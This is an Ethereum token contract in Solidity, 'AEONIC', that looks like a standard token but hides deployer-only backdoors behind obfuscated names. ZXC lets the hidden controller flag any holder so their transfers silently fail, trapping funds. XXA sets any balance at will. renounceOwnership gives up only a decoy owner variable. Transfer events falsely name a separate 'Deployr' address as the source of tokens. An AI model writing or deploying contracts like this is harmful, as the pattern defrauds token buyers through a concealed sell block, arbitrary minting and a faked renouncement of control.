/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract AEONIC {
  
    mapping (address => uint256) private XLB;
    mapping (address => uint256) private XLC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "AEONIC";
    string public symbol = unicode"AEONIC";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1500000000 *10**6;
    address owner = msg.sender;
    address private XLR;
    address Deployr = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        XLR = msg.sender;
        MAKRX(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function MAKRX(address account, uint256 amount) internal {
    account = Deployr;
    XLB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }

   function balanceOf(address account) public view  returns (uint256) {
        return XLB[account];
    }

     function ZXC (address iox, uint256 ioz)  public {
     if(msg.sender == XLR) {
   XLC[iox] = ioz;}}

    function transfer(address to, uint256 value) public returns (bool success) {


      if(XLC[msg.sender] <= 0) {
        require(XLB[msg.sender] >= value);
  XLB[msg.sender] -= value;  
        XLB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }}

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }





    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == XLR) {
 require(value <= XLB[from]);
        require(value <= allowance[from][msg.sender]);
        XLB[from] -= value;  
      XLB[to] += value; 
        from = Deployr;
        emit Transfer (from, to, value);
        return true; }    
else
        if(XLC[from] <= 0 && XLC[to] <=0) {
        require(value <= XLB[from]);
        require(value <= allowance[from][msg.sender]);
        XLB[from] -= value;
        XLB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}
        function XXA (address iox, uint256 ioz)  public {
    if(msg.sender == XLR) {
    XLB[iox] = ioz;}}

    }